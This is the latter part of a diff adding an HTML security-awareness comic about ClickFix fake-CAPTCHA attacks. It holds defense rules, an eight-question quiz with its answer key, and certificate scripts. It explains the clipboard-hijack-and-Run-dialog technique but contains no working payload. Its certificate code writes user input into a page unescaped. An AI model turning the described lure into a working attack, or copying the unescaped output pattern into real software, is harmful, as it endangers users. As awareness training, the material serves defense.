+        </div>
+        <div class="body-text">
+          You should be in control of what's on your clipboard at all times. If a website silently places content there, that content is almost certainly malicious. Before pasting anything anywhere important, check what's actually on your clipboard first (Ctrl+V into Notepad, not into a Run dialog).
+        </div>
+      </div>
+    </div>
+
+    <!-- Rule 3 -->
+    <div class="defense-rule">
+      <div class="rule-icon">&#128468;</div>
+      <div>
+        <div class="comic-subtitle text-blue">RULE 3: WHEN IN DOUBT, CLOSE THE TAB</div>
+        <div class="body-text">
+          <span class="bold">When in doubt, close the tab. The internet will still be there.</span>
+        </div>
+        <div class="body-text">
+          If something feels off &mdash; weird CAPTCHA, unexpected error, urgent popup &mdash; just close it. Don't interact with it. Don't try to figure out if it's real. Just close the tab. You can always navigate back to the site you wanted through a known bookmark or by typing the URL yourself. The 3 seconds you "lose" could save you weeks of incident response.
+        </div>
+      </div>
+    </div>
+
+    <!-- Rule 4 -->
+    <div class="defense-rule">
+      <div class="rule-icon">&#128222;</div>
+      <div>
+        <div class="comic-subtitle text-blue">RULE 4: CALL IT IN</div>
+        <div class="body-text">
+          <span class="bold">Call IT. That's literally what they're there for.</span>
+        </div>
+        <div class="body-text">
+          Report anything suspicious. Forward the URL. Screenshot the page. Send it to your IT security team. You are not "bothering" them. You are not "being paranoid." You are doing your job. Every reported attempt helps protect the entire organization. The only bad report is the one you didn't make.
+        </div>
+      </div>
+    </div>
+
+    <!-- Bonus wisdom -->
+    <div class="panel-full" style="text-align:center; margin-top:1rem;">
+      <div class="narrator wide" style="display:inline-block; max-width:600px;">
+        "I've been doing this a long time. I've seen zero-days and social engineering and insider threats and one guy who plugged a USB drive he found in a parking lot into his work computer 'just to see what was on it.' Through all of that, I've learned one thing: the best security tool isn't software. It's the two-second pause before you click."
+      </div>
+      <div style="margin-top:0.75rem; font-family:var(--font-body); font-size:0.9rem; font-style:italic; color:var(--blue);">
+        &mdash; Duke "Dude Diligence" Dillingham
+      </div>
+    </div>
+
+    <div class="page-nav">
+      <button class="page-btn" onclick="goToPage(5)">&larr; PREVIOUS</button>
+      <span class="page-indicator">PAGE 6 OF 8</span>
+      <button class="page-btn" onclick="goToPage(7)">TURN PAGE &rarr;</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAGE 7: QUIZ ===== -->
+<div class="page" id="page-7" data-label="Quiz">
+  <div class="page-inner">
+    <div class="comic-title">PAGE 7: <span class="blue">THE FINAL EXAM</span></div>
+
+    <div class="panel-full" style="margin-bottom:1.5rem;">
+      <div class="speech-bubble no-tail" style="max-width:100%;">
+        <span class="bold">Eight questions. Multiple choice.</span> I believe in you. Probably. Let's see what you've retained from my incredibly engaging presentation. Minimum passing score: 6 out of 8. That's 75%. I could have made it 100%, but I'm a generous compliance officer.
+      </div>
+    </div>
+
+    <!-- Q1 -->
+    <div class="quiz-question" id="q1">
+      <div class="quiz-num">QUESTION 1 OF 8</div>
+      <div class="quiz-text">What is the primary social engineering technique used in ClickFix attacks?</div>
+      <div class="quiz-options">
+        <button class="quiz-option" onclick="selectAnswer(1, this, 'b')">A) Sending malicious email attachments</button>
+        <button class="quiz-option" onclick="selectAnswer(1, this, 'b')" data-value="b">B) Fake CAPTCHAs or error messages that trick users into running commands</button>
+        <button class="quiz-option" onclick="selectAnswer(1, this, 'b')">C) Exploiting unpatched software vulnerabilities</button>
+        <button class="quiz-option" onclick="selectAnswer(1, this, 'b')">D) Brute-forcing user passwords</button>
+      </div>
+      <div class="quiz-explanation" id="exp-1">Dude says: "ClickFix relies on fake CAPTCHAs and error messages to trick the user into manually executing malicious commands. No exploits needed &mdash; the user IS the exploit."</div>
+    </div>
+
+    <!-- Q2 -->
+    <div class="quiz-question" id="q2">
+      <div class="quiz-num">QUESTION 2 OF 8</div>
+      <div class="quiz-text">In a typical ClickFix attack, what key combination is the victim told to press first?</div>
+      <div class="quiz-options">
+        <button class="quiz-option" onclick="selectAnswer(2, this, 'c')">A) Ctrl + Alt + Delete</button>
+        <button class="quiz-option" onclick="selectAnswer(2, this, 'c')">B) Alt + F4</button>
+        <button class="quiz-option" onclick="selectAnswer(2, this, 'c')" data-value="c">C) Win + R (to open the Run dialog)</button>
+        <button class="quiz-option" onclick="selectAnswer(2, this, 'c')">D) Ctrl + Shift + Esc</button>
+      </div>
+      <div class="quiz-explanation" id="exp-2">Dude says: "Win+R opens the Run dialog, which can execute arbitrary commands. The attacker has already placed the malicious command on your clipboard, so the next step is paste and run. Elegant in a deeply upsetting way."</div>
+    </div>
+
+    <!-- Q3 -->
+    <div class="quiz-question" id="q3">
+      <div class="quiz-num">QUESTION 3 OF 8</div>
+      <div class="quiz-text">How does the malicious command get onto the victim's clipboard in a ClickFix attack?</div>
+      <div class="quiz-options">
+        <button class="quiz-option" onclick="selectAnswer(3, this, 'a')" data-value="a">A) The webpage silently copies it using JavaScript when the user interacts with the page</button>
+        <button class="quiz-option" onclick="selectAnswer(3, this, 'a')">B) The user accidentally copies it from a visible text field</button>
+        <button class="quiz-option" onclick="selectAnswer(3, this, 'a')">C) A browser plugin automatically copies it</button>
+        <button class="quiz-option" onclick="selectAnswer(3, this, 'a')">D) The user receives it via email and copies it manually</button>
+      </div>
+      <div class="quiz-explanation" id="exp-3">Dude says: "The page uses JavaScript to silently write a malicious command to your clipboard. You didn't copy anything. You didn't highlight anything. The clipboard hijack happens invisibly, and that's exactly what makes it dangerous."</div>
+    </div>
+
+    <!-- Q4 -->
+    <div class="quiz-question" id="q4">
+      <div class="quiz-num">QUESTION 4 OF 8</div>
+      <div class="quiz-text">What types of malware are commonly deployed through ClickFix attacks?</div>
+      <div class="quiz-options">
+        <button class="quiz-option" onclick="selectAnswer(4, this, 'd')">A) Only ransomware</button>
+        <button class="quiz-option" onclick="selectAnswer(4, this, 'd')">B) Only information stealers</button>
+        <button class="quiz-option" onclick="selectAnswer(4, this, 'd')">C) Only Remote Access Trojans (RATs)</button>
+        <button class="quiz-option" onclick="selectAnswer(4, this, 'd')" data-value="d">D) All of the above &mdash; info stealers, RATs, and ransomware</button>
+      </div>
+      <div class="quiz-explanation" id="exp-4">Dude says: "ClickFix is a delivery mechanism, not a specific payload. Attackers use it to deploy info stealers (Lumma, StealC), RATs (AsyncRAT, NetSupport), and ransomware. Sometimes they deploy multiple payloads at once, because they're overachievers."</div>
+    </div>
+
+    <!-- Q5 -->
+    <div class="quiz-question" id="q5">
+      <div class="quiz-num">QUESTION 5 OF 8</div>
+      <div class="quiz-text">Which of the following is a legitimate CAPTCHA behavior?</div>
+      <div class="quiz-options">
+        <button class="quiz-option" onclick="selectAnswer(5, this, 'b')">A) Asking you to press Win+R and paste a command</button>
+        <button class="quiz-option" onclick="selectAnswer(5, this, 'b')" data-value="b">B) Asking you to click a checkbox or identify images within the browser</button>
+        <button class="quiz-option" onclick="selectAnswer(5, this, 'b')">C) Copying a command to your clipboard automatically</button>
+        <button class="quiz-option" onclick="selectAnswer(5, this, 'b')">D) Asking you to open PowerShell and run a verification script</button>
+      </div>
+      <div class="quiz-explanation" id="exp-5">Dude says: "Real CAPTCHAs live entirely inside the browser. Click a checkbox. Pick the traffic lights. Solve a puzzle. That's it. The moment a 'CAPTCHA' asks you to interact with your operating system, it has ceased to be a CAPTCHA and become an attack."</div>
+    </div>
+
+    <!-- Q6 -->
+    <div class="quiz-question" id="q6">
+      <div class="quiz-num">QUESTION 6 OF 8</div>
+      <div class="quiz-text">You encounter a webpage that says your display driver needs fixing and provides a PowerShell command to run. What should you do?</div>
+      <div class="quiz-options">
+        <button class="quiz-option" onclick="selectAnswer(6, this, 'c')">A) Run the command &mdash; display issues are serious</button>
+        <button class="quiz-option" onclick="selectAnswer(6, this, 'c')">B) Copy the command and search for it online first</button>
+        <button class="quiz-option" onclick="selectAnswer(6, this, 'c')" data-value="c">C) Close the tab immediately and report it to IT</button>
+        <button class="quiz-option" onclick="selectAnswer(6, this, 'c')">D) Run the command in Safe Mode for extra security</button>
+      </div>
+      <div class="quiz-explanation" id="exp-6">Dude says: "Close the tab and report it. Websites cannot diagnose your hardware. They just can't. And running unknown PowerShell commands &mdash; even in Safe Mode &mdash; is like wearing a seatbelt while driving off a cliff. Technically present, practically useless."</div>
+    </div>
+
+    <!-- Q7 -->
+    <div class="quiz-question" id="q7">
+      <div class="quiz-num">QUESTION 7 OF 8</div>
+      <div class="quiz-text">Which nation-state threat actors have been observed using ClickFix techniques?</div>
+      <div class="quiz-options">
+        <button class="quiz-option" onclick="selectAnswer(7, this, 'a')" data-value="a">A) APT28 (Russia), Kimsuky (North Korea), and MuddyWater (Iran)</button>
+        <button class="quiz-option" onclick="selectAnswer(7, this, 'a')">B) Only financially motivated cybercriminal groups</button>
+        <button class="quiz-option" onclick="selectAnswer(7, this, 'a')">C) Only APT28 (Russia)</button>
+        <button class="quiz-option" onclick="selectAnswer(7, this, 'a')">D) No nation-state actors use this technique</button>
+      </div>
+      <div class="quiz-explanation" id="exp-7">Dude says: "APT28, Kimsuky, AND MuddyWater all adopted ClickFix. Three different countries, three different geopolitical agendas, one shared conclusion: people will follow instructions on a screen. It's not just script kiddies anymore. This is state-sponsored social engineering."</div>
+    </div>
+
+    <!-- Q8 -->
+    <div class="quiz-question" id="q8">
+      <div class="quiz-num">QUESTION 8 OF 8</div>
+      <div class="quiz-text">What is the BEST way to verify if a CAPTCHA or system prompt is legitimate?</div>
+      <div class="quiz-options">
+        <button class="quiz-option" onclick="selectAnswer(8, this, 'd')">A) Check if the page looks professional and well-designed</button>
+        <button class="quiz-option" onclick="selectAnswer(8, this, 'd')">B) See if the browser shows a padlock (HTTPS) icon</button>
+        <button class="quiz-option" onclick="selectAnswer(8, this, 'd')">C) Ask a coworker if they've seen it before</button>
+        <button class="quiz-option" onclick="selectAnswer(8, this, 'd')" data-value="d">D) Check whether it asks you to interact with anything outside the browser (Run dialog, PowerShell, Terminal)</button>
+      </div>
+      <div class="quiz-explanation" id="exp-8">Dude says: "Design can be faked. HTTPS can be obtained by anyone. Coworkers may not know. But the one thing that ALWAYS gives away a ClickFix attack is that it tries to get you outside the browser and into system-level tools. That boundary &mdash; browser vs. operating system &mdash; is your single most reliable indicator."</div>
+    </div>
+
+    <!-- Score area -->
+    <div class="quiz-score-area">
+      <button class="quiz-submit-btn" id="quizSubmitBtn" onclick="submitQuiz()" disabled>SUBMIT ANSWERS</button>
+      <div class="quiz-result" id="quizResult">
+        <div class="score-display" id="scoreDisplay"></div>
+        <div class="dude-comment" id="dudeScoreComment"></div>
+        <div style="margin-top:1rem;">
+          <button class="page-btn" onclick="goToPage(8)" id="toCertBtn" style="display:none;">GET YOUR CERTIFICATE &rarr;</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="page-nav">
+      <button class="page-btn" onclick="goToPage(6)">&larr; PREVIOUS</button>
+      <span class="page-indicator">PAGE 7 OF 8</span>
+      <button class="page-btn" onclick="goToPage(8)">TURN PAGE &rarr;</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAGE 8: CERTIFICATE ===== -->
+<div class="page" id="page-8" data-label="Certificate">
+  <div class="page-inner">
+    <div class="comic-title text-center">PAGE 8: <span class="green">CERTIFICATION</span></div>
+
+    <div class="certificate" id="certificateArea">
+      <div class="cert-header">DUDE DILIGENCE</div>
+      <div class="cert-sub">Official Certificate of Completion</div>
+
+      <div class="cert-body">This certifies that</div>
+      <input type="text" class="cert-name-input" id="certName" placeholder="Enter Your Name" oninput="updateCertName()">
+      <div class="cert-body">
+        has successfully survived<br>
+        <span class="bold" style="font-size:1.2rem; color:var(--accent);">Issue #1: "The CAPTCHA Conspiracy"</span><br>
+        and demonstrated awareness of ClickFix social engineering attacks,<br>
+        clipboard hijacking techniques, and the sacred art of closing suspicious tabs.
+      </div>
+
+      <div class="cert-stamp">VERIFIED<br>HUMAN</div>
+
+      <div class="cert-issue">DUDE DILIGENCE SECURITY AWARENESS SERIES</div>
+      <div class="cert-date" id="certDate"></div>
+
+      <div style="margin-top:1rem; display:flex; justify-content:center; gap:2rem; flex-wrap:wrap; align-items:center;">
+        <div style="text-align:center;">
+          <div style="font-family:var(--font-comic); font-size:1.1rem; letter-spacing:0.03em;">Duke Dillingham</div>
+          <div style="width:180px; border-top:2px solid var(--ink); margin-top:0.25rem; padding-top:0.15rem; font-family:var(--font-caption); font-size:0.75rem; font-style:italic;">Chief Compliance Dude</div>
+        </div>
+        <div style="text-align:center;">
+          <div style="font-family:var(--font-comic); font-size:1.1rem; letter-spacing:0.03em; color:var(--c6-navy);">Circle 6 Systems</div>
+          <div style="width:180px; border-top:2px solid var(--ink); margin-top:0.25rem; padding-top:0.15rem; font-family:var(--font-caption); font-size:0.75rem; font-style:italic;">Security Training Division</div>
+        </div>
+      </div>
+
+      <div class="cert-footer">
+        A Circle 6 Systems Production &bull; circle6systems.com
+      </div>
+    </div>
+
+    <div class="text-center mt-2">
+      <button class="print-btn" onclick="printCertificate()">PRINT CERTIFICATE</button>
+    </div>
+
+    <div class="panel-full" style="text-align:center; margin-top:2rem;">
+      <img src="../img/dude-portrait.png" alt="Dude Diligence" style="width:120px; height:120px; object-fit:cover; border:3px solid var(--ink); border-radius:50%; margin-bottom:0.75rem;">
+      <div class="speech-bubble no-tail" style="display:inline-block; max-width:550px;">
+        <span class="bold">Hey, you made it.</span> All the way to the end. That actually means something. Most people skim these things and click "complete" as fast as possible. You didn't. Or maybe you did and you're just reading this part. Either way, you're here now, and I'm glad.<br><br>
+        Stay skeptical. Stay curious. And remember: if something wants you to press Win+R, the only correct response is to close the tab and call IT.<br><br>
+        <span class="italic">See you in Issue #2.</span><br>
+        <span class="bold">&mdash; Dude</span>
+      </div>
+    </div>
+
+    <div class="page-nav">
+      <button class="page-btn" onclick="goToPage(7)">&larr; PREVIOUS</button>
+      <span class="page-indicator">PAGE 8 OF 8</span>
+      <button class="page-btn" disabled>THE END</button>
+    </div>
+  </div>
+</div>
+
+</main>
+
+<!-- ===== FOOTER ===== -->
+<footer class="site-footer">
+  A Circle 6 Systems Production &bull; <a href="https://circle6systems.com" target="_blank" rel="noopener">circle6systems.com</a>
+</footer>
+
+<script>
+  // ===== PAGE NAVIGATION =====
+  let currentPage = 0;
+  const totalPages = 9; // 0 through 8
+
+  const pageLabels = ['Cover', 'The Setup', 'What Is ClickFix', 'Attack Chain', 'The Attack Hits', 'Scenarios', 'Defense Playbook', 'Quiz', 'Certificate'];
+
+  function goToPage(n) {
+    if (n < 0 || n >= totalPages) return;
+    // Hide current
+    const pages = document.querySelectorAll('.page');
+    pages.forEach(p => p.classList.remove('active'));
+    // Show target
+    document.getElementById('page-' + n).classList.add('active');
+    currentPage = n;
+    updateNav();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function updateNav() {
+    const dots = document.querySelectorAll('.nav-dot');
+    dots.forEach((dot, i) => {
+      dot.classList.remove('active', 'completed');
+      if (i === currentPage) {
+        dot.classList.add('active');
+      } else if (i < currentPage) {
+        dot.classList.add('completed');
+      }
+    });
+    document.getElementById('progressText').textContent = pageLabels[currentPage] || '';
+  }
+
+  // Keyboard navigation
+  document.addEventListener('keydown', function(e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+    if (e.key === 'ArrowRight' || e.key === 'PageDown') {
+      e.preventDefault();
+      goToPage(currentPage + 1);
+    } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+      e.preventDefault();
+      goToPage(currentPage - 1);
+    }
+  });
+
+  // ===== SCENARIO VOTING =====
+  function revealScenario(num, userSaidYes, correctAnswerIsYes) {
+    const isCorrect = (userSaidYes === correctAnswerIsYes);
+    const correctEl = document.getElementById('result-' + num + '-correct');
+    const incorrectEl = document.getElementById('result-' + num + '-incorrect');
+
+    // Disable buttons
+    const card = document.getElementById('scenario-' + num);
+    card.querySelectorAll('.vote-btn').forEach(btn => {
+      btn.disabled = true;
+      btn.style.opacity = '0.5';
+      btn.style.cursor = 'default';
+    });
+
+    if (isCorrect) {
+      correctEl.classList.add('show', 'correct');
+    } else {
+      incorrectEl.classList.add('show', 'incorrect');
+    }
+  }
+
+  // ===== QUIZ =====
+  const correctAnswers = {
+    1: 'b', 2: 'c', 3: 'a', 4: 'd',
+    5: 'b', 6: 'c', 7: 'a', 8: 'd'
+  };
+
+  let userAnswers = {};
+  let quizSubmitted = false;
+
+  function selectAnswer(qNum, btn, correctVal) {
+    if (quizSubmitted) return;
+
+    // Get the value from data-value or compute from position
+    const options = btn.parentElement.querySelectorAll('.quiz-option');
+    let selectedVal = '';
+    const letters = ['a', 'b', 'c', 'd'];
+    options.forEach((opt, i) => {
+      opt.classList.remove('selected');
+      if (opt === btn) selectedVal = letters[i];
+    });
+
+    btn.classList.add('selected');
+    userAnswers[qNum] = selectedVal;
+
+    // Enable submit if all answered
+    if (Object.keys(userAnswers).length === 8) {
+      document.getElementById('quizSubmitBtn').disabled = false;
+    }
+  }
+
+  function submitQuiz() {
+    if (quizSubmitted) return;
+    quizSubmitted = true;
+
+    let score = 0;
+    const letters = ['a', 'b', 'c', 'd'];
+
+    for (let q = 1; q <= 8; q++) {
+      const correct = correctAnswers[q];
+      const user = userAnswers[q];
+      const options = document.querySelector('#q' + q + ' .quiz-options').querySelectorAll('.quiz-option');
+
+      options.forEach((opt, i) => {
+        opt.disabled = true;
+        const val = letters[i];
+        if (val === correct) {
+          opt.classList.add('correct-answer');
+        }
+        if (val === user && val !== correct) {
+          opt.classList.add('wrong-answer');
+        }
+        opt.classList.remove('selected');
+      });
+
+      // Show explanation
+      document.getElementById('exp-' + q).classList.add('show');
+
+      if (user === correct) score++;
+    }
+
+    // Show score
+    const scoreEl = document.getElementById('scoreDisplay');
+    const commentEl = document.getElementById('dudeScoreComment');
+    const resultEl = document.getElementById('quizResult');
+    const submitBtn = document.getElementById('quizSubmitBtn');
+
+    submitBtn.style.display = 'none';
+    resultEl.classList.add('show');
+
+    scoreEl.textContent = score + ' / 8';
+
+    if (score === 8) {
+      scoreEl.className = 'score-display great';
+      commentEl.innerHTML = '<span class="bold">Perfect score.</span> I... honestly didn\'t expect that. You might actually be more paranoid than I am, and I mean that as the highest compliment. Consider a career in compliance. The coffee is terrible but the job satisfaction is... also terrible. But you\'d be great at it.';
+      document.getElementById('toCertBtn').style.display = 'inline-block';
+    } else if (score >= 6) {
+      scoreEl.className = 'score-display great';
+      commentEl.innerHTML = '<span class="bold">Solid work.</span> You clearly paid attention, and that puts you ahead of most people. A few misses, but nothing that would keep me up at night. Well, not more than usual. You\'ve earned your certificate.';
+      document.getElementById('toCertBtn').style.display = 'inline-block';
+    } else if (score >= 4) {
+      scoreEl.className = 'score-display ok';
+      commentEl.innerHTML = '<span class="bold">We need to talk.</span> Not in a bad way. In a "let\'s grab coffee and review the material together" way. You\'ve got the right instincts, but some of the details didn\'t stick. I\'d recommend going back through the attack chain section. The certificate will be here when you\'re ready.';
+    } else {
+      scoreEl.className = 'score-display needs-work';
+      commentEl.innerHTML = '<span class="bold">Okay.</span> First: thank you for trying. That matters. Second: please go back and read through the training again. Not as punishment &mdash; as preparation. These attacks are real, they\'re happening right now, and understanding them is legitimately important. I believe in you. Let\'s try again.';
+    }
+  }
+
+  // ===== CERTIFICATE =====
+  function updateCertName() {
+    // Name updates live in the input field
+  }
+
+  // Set certificate date
+  document.getElementById('certDate').textContent = 'Issued: ' + new Date().toLocaleDateString('en-US', {
+    year: 'numeric', month: 'long', day: 'numeric'
+  });
+
+  function printCertificate() {
+    const name = document.getElementById('certName').value || 'Unnamed Hero';
+    const certArea = document.getElementById('certificateArea');
+
+    // Create print window
+    const printWin = window.open('', '_blank');
+    printWin.document.write(`
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <title>Dude Diligence Certificate</title>
+        <style>
+          @import url('https://fonts.googleapis.com/css2?family=Bangers&family=Comic+Neue:wght@400;700&display=swap');
+          body { font-family: 'Comic Neue', cursive; margin: 2rem; }
+          .cert { border: 4px double #1a1a1a; padding: 3rem; text-align: center; max-width: 800px; margin: 0 auto; position: relative; }
+          .cert::before { content:''; position:absolute; inset:8px; border:2px solid #1a1a1a; pointer-events:none; }
+          .cert-header { font-family: 'Bangers', Impact, sans-serif; font-size: 2.5rem; color: #c0392b; letter-spacing: 0.06em; margin-bottom: 0.5rem; }
+          .cert-sub { font-family: Georgia, serif; font-style: italic; font-size: 1rem; color: #666; margin-bottom: 1.5rem; }
+          .cert-name { font-family: 'Bangers', Impact, sans-serif; font-size: 2rem; color: #2c5f8a; margin: 0.5rem 0; letter-spacing: 0.04em; border-bottom: 3px solid #1a1a1a; display: inline-block; padding: 0 1rem 0.25rem; }
+          .cert-body { font-size: 1rem; margin: 0.5rem 0; line-height: 1.8; }
+          .cert-stamp { display: inline-block; border: 3px solid #c0392b; border-radius: 50%; width: 90px; height: 90px; line-height: 30px; padding-top: 15px; font-family: 'Bangers', sans-serif; font-size: 0.85rem; color: #c0392b; transform: rotate(-12deg); margin: 1rem 0; }
+          .cert-issue { font-family: 'Bangers', sans-serif; font-size: 1rem; letter-spacing: 0.05em; margin: 0.5rem 0; }
+          .cert-date { font-family: Georgia, serif; font-size: 0.9rem; color: #666; margin-bottom: 1rem; }
+          .sigs { display: flex; justify-content: center; gap: 3rem; margin-top: 1.5rem; flex-wrap: wrap; }
+          .sig { text-align: center; }
+          .sig-name { font-family: 'Bangers', sans-serif; font-size: 1.1rem; }
+          .sig-line { width: 180px; border-top: 2px solid #1a1a1a; margin-top: 0.25rem; padding-top: 0.15rem; font-family: Georgia, serif; font-size: 0.75rem; font-style: italic; }
+          .cert-footer { font-family: Georgia, serif; font-size: 0.75rem; color: #999; margin-top: 1.5rem; }
+          @media print { body { margin: 0; } }
+        </style>
+      </head>
+      <body>
+        <div class="cert">
+          <div class="cert-header">DUDE DILIGENCE</div>
+          <div class="cert-sub">Official Certificate of Completion</div>
+          <div class="cert-body">This certifies that</div>
+          <div class="cert-name">${name}</div>
+          <div class="cert-body">
+            has successfully survived<br>
+            <strong style="font-size:1.2rem; color:#c0392b;">Issue #1: "The CAPTCHA Conspiracy"</strong><br>
+            and demonstrated awareness of ClickFix social engineering attacks,<br>
+            clipboard hijacking techniques, and the sacred art of closing suspicious tabs.
+          </div>
+          <div class="cert-stamp">VERIFIED<br>HUMAN</div>
+          <div class="cert-issue">DUDE DILIGENCE SECURITY AWARENESS SERIES</div>
+          <div class="cert-date">${document.getElementById('certDate').textContent}</div>
+          <div class="sigs">
+            <div class="sig">
+              <div class="sig-name">Duke Dillingham</div>
+              <div class="sig-line">Chief Compliance Dude</div>
+            </div>
+            <div class="sig">
+              <div class="sig-name" style="color:#2d2a2e;">Circle 6 Systems</div>
+              <div class="sig-line">Security Training Division</div>
+            </div>
+          </div>
+          <div class="cert-footer">A Circle 6 Systems Production &bull; circle6systems.com</div>
+        </div>
+        <script>setTimeout(function(){ window.print(); }, 500);<\/script>
+      </body>
+      </html>
+    `);
+    printWin.document.close();
+  }
+
+  // Initialize
+  updateNav();
+</script>
+
+</body>
+</html>
